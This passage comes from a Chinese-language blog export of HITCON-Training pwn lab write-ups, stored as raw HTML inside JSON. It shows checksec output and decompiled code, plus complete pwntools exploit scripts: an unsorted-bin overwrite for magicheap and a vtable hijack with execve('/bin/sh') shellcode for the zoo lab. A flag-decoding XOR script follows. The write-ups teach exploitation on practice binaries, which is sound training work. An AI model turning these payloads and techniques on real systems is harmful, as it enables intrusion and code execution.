class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./magicheap\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./magicheap\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap:\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(content)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"c\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">addr = <span class=\"number\">0x6020c0</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x20</span>) + p64(<span class=\"number\">0x91</span>) + <span class=\"string\">\"aaaaaaaa\"</span> + p64(addr)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab15——zoo\"><a href=\"#Lab15——zoo\" class=\"headerlink\" title=\"Lab15——zoo\"></a>Lab15——zoo</h2><h3 id=\"防护-5\"><a href=\"#防护-5\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>该题没有开启NX和PIE，只有canary。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab15$ checksec zoo</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab15/zoo&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题是C++编写的。首先会读入0x64bytes到全局变量nameofzoo。</p>\n<h4 id=\"adddog\"><a href=\"#adddog\" class=\"headerlink\" title=\"adddog\"></a>adddog</h4><p>要求输入name和weight，然后new一个0x28的dog对象，调用构造函数初始化，然后向animallist这个vector中插入当前dog对象。</p>\n<p>逆向可得Dog类的结构如下：有两个成员函数和两个成员变量，存储name和weight。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Dog</span> :</span> Animal&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">speak</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">info</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> name[<span class=\"number\">24</span>];<span class=\"comment\">// + 8</span></span><br><span class=\"line\">\t<span class=\"keyword\">long</span> weight; <span class=\"comment\">// + 32</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中成员函数指向rodata段的vtable。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.rodata:0000000000403130 `vtable for&apos;Dog dq 0                    ; offset to this</span><br><span class=\"line\">.rodata:0000000000403138                 dq offset `typeinfo for&apos;Dog</span><br><span class=\"line\">.rodata:0000000000403140 off_403140      dq offset Dog::speak(void)</span><br><span class=\"line\">.rodata:0000000000403140                                         ; DATA XREF: Dog::Dog(std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;,int)+1F↑o</span><br><span class=\"line\">.rodata:0000000000403148                 dq offset Dog::info(void)</span><br><span class=\"line\">.rodata:0000000000403150                 public `vtable for&apos;Animal ; weak</span><br></pre></td></tr></table></figure>\n<p>Dog的构造函数中存在堆溢出漏洞，由于直接使用strcpy。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">adddog</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 dog; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> weight; <span class=\"comment\">// [rsp+Ch] [rbp-74h]</span></span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// [rsp+10h] [rbp-70h]</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-68h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v5; <span class=\"comment\">// [rsp+20h] [rbp-60h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> name; <span class=\"comment\">// [rsp+40h] [rbp-40h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v7; <span class=\"comment\">// [rsp+68h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::basic_string(&amp;v5);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">\"Name : \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&gt;&gt;&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;edata, &amp;v5);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">\"Weight : \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::istream::<span class=\"keyword\">operator</span>&gt;&gt;(&amp;edata, &amp;weight);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::basic_string(&amp;name, &amp;v5);</span><br><span class=\"line\">  dog = <span class=\"keyword\">operator</span> <span class=\"keyword\">new</span>(<span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  Dog::Dog(dog, (__int64)&amp;name, weight);</span><br><span class=\"line\">  v4 = dog;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::~basic_string(&amp;name);</span><br><span class=\"line\">  v3 = v4;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">vector</span>&lt;Animal *,<span class=\"built_in\">std</span>::allocator&lt;Animal *&gt;&gt;::push_back(&amp;animallist, &amp;v3);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::~basic_string(&amp;v5);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v7;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"addcat\"><a href=\"#addcat\" class=\"headerlink\" title=\"addcat\"></a>addcat</h4><p>和adddog完全一样，只不过new的是cat对象，同样push_back到animallist中。</p>\n<h4 id=\"listen\"><a href=\"#listen\" class=\"headerlink\" title=\"listen\"></a>listen</h4><p>首先检查animallist的size是否为0，是则直接退出。然后若index合法，则直接调用相应animal的speak函数。这里不难想到，如果我们可以劫持vtable，也就可以劫持控制流了。</p>\n<h4 id=\"show-1\"><a href=\"#show-1\" class=\"headerlink\" title=\"show\"></a>show</h4><p>同上，也是调用对象的成员函数。打印出对象的name和info字段。</p>\n<h4 id=\"remove\"><a href=\"#remove\" class=\"headerlink\" title=\"remove\"></a>remove</h4><p>首先delete掉animallist上对应index的对象，然后erase掉vector上相应项。</p>\n<h3 id=\"利用-4\"><a href=\"#利用-4\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>这里主要的难点是获取覆盖虚表指针的偏移，可以用gdb调试获得。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x0000000001263c20</span><br><span class=\"line\">0x1263c20:\t0x0000000000403140\t0x0000000031676f64</span><br><span class=\"line\">0x1263c30:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c40:\t0x0000000000000028\t0x0000000000000021</span><br><span class=\"line\">0x1263c50:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c60:\t0x0000000000000000\t0x0000000000000031</span><br><span class=\"line\">0x1263c70:\t0x0000000000403140\t0x0000000032676f64</span><br><span class=\"line\">0x1263c80:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c90:\t0x0000000000000028\t0x0000000000000021</span><br><span class=\"line\">0x1263ca0:\t0x0000000001263c20\t0x0000000001263c70</span><br><span class=\"line\">0x1263cb0:\t0x0000000000000000\t0x0000000000020351</span><br><span class=\"line\">0x1263cc0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263cd0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263ce0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263cf0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263d00:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263d10:\t0x0000000000000000\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>可以看到0x1263c70处是要覆盖的虚表地址，而我们是从0x1263c28处开始写，所以需要padding 9 * 0x8 bytes。</p>\n<p>直接在读入zooname时在bss段布置好shellcode和fake vtable，最后直接覆盖vtable即可。</p>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./zoo\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./zoo\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">adddog</span><span class=\"params\">(name, weight)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Name : \"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Weight : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(weight))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">addcat</span><span class=\"params\">(name, weight)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Name : \"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Weight : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(weight))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">listen</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">remove</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"5\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Name of Your zoo :\"</span>, shellcode + p64(<span class=\"number\">0x605420</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">adddog(<span class=\"string\">\"dog1\"</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\">adddog(<span class=\"string\">\"dog2\"</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">remove(<span class=\"number\">0</span>)</span><br><span class=\"line\">adddog(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x8</span> * <span class=\"number\">9</span> + p64(<span class=\"number\">0x605420</span> + len(shellcode)),<span class=\"number\">40</span>)</span><br><span class=\"line\">listen(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","text":"Lab10——hacknote防护可以看到本题开启了canary和nx，这时想在栈上进行利用就相当困难了。1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checkse","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}]},{"title":"HITCON_training题解(一)","slug":"HITCON-training-1","date":"2019-04-10T06:47:42.000Z","updated":"2019-04-10T06:58:02.000Z","comments":true,"path":"api/articles/HITCON-training-1.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"Lab1——sysmagic\"><a href=\"#Lab1——sysmagic\" class=\"headerlink\" title=\"Lab1——sysmagic\"></a>Lab1——sysmagic</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab1/sysmagic&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>程序要求输入一个magic，然后就直接退出。用IDA看一下：</p>\n<p>在函数get_flag中直接要求读入到栈上v2处（ebp+0x7c），如果v2和随机数buf相等，则直接打印出栈上的flag。buf在(ebp+0x80处)。不过貌似没有较好的溢出方法，不过这实际上是一道逆向题，通过逆向可以直接找到答案。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd = open(<span class=\"string\">\"/dev/urandom\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"> read(fd, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"Give me maigc :\"</span>);</span><br><span class=\"line\"> __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v2);</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( buf == v2 )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x30</span>; ++i )</span><br><span class=\"line\">     <span class=\"built_in\">putchar</span>((<span class=\"keyword\">char</span>)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i)));</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>观察汇编代码，还原两个字符串，然后按位异或即可找到flag。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str1 = &apos;\\x44\\x6f\\x5f\\x79\\x6f\\x75\\x5f\\x6b&apos;</span><br><span class=\"line\">str1 += &apos;\\x6e\\x6f\\x77\\x5f\\x77\\x68\\x79\\x5f&apos;</span><br><span class=\"line\">str1 += &apos;\\x6d\\x79\\x5f\\x74\\x65\\x61\\x6d\\x6d&apos;</span><br><span class=\"line\">str1 += &apos;\\x61\\x74\\x65\\x5f\\x4f\\x72\\x61\\x6e&apos;</span><br><span class=\"line\">str1 += &apos;\\x67\\x65\\x5f\\x69\\x73\\x5f\\x73\\x6f&apos;</span><br><span class=\"line\">str1 += &apos;\\x5f\\x61\\x6e\\x67\\x72\\x79\\x3f\\x3f\\x3f&apos;</span><br><span class=\"line\">str2 = &apos;\\x07\\x3b\\x19\\x02\\x0b\\x10\\x3d\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x08\\x12\\x2d\\x28\\x59\\x0a\\x00\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x16\\x00\\x04\\x55\\x16\\x08\\x1f\\x07\\x01&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x00\\x7e\\x1c\\x3e\\x0a\\x1e\\x0b\\x6b&apos;</span><br><span class=\"line\">str2 += &apos;\\x04\\x42\\x3c\\x2c\\x5b\\x31\\x55\\x02\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x21\\x10\\x4c\\x1e\\x42&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">flag = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(len(str1)):</span><br><span class=\"line\">\tflag += chr(ord(str1[i]) ^ ord(str2[i]))</span><br><span class=\"line\"></span><br><span class=\"line\">print flag</span><br><span class=\"line\"></span><br><span class=\"line\">CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;</span><br><span class=\"line\">[Finished in 0.1s]</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab2——orw\"><a href=\"#Lab2——orw\" class=\"headerlink\" title=\"Lab2——orw\"></a>Lab2——orw</h2><p>是手写汇编的练习，略。</p>\n<h2 id=\"Lab3——ret2shellcode\"><a href=\"#Lab3——ret2shellcode\" class=\"headerlink\" title=\"Lab3——ret2shellcode\"></a>Lab3——ret2shellcode</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>未开启任何防护</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab3$ checksec ret2sc</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab3/ret2sc&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>顾名思义，该题是用ret2sc的方法。main函数中首先从stdin读入，往bss段上写了0x32字节，然后栈溢出返回到刚刚写的地址即可。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span 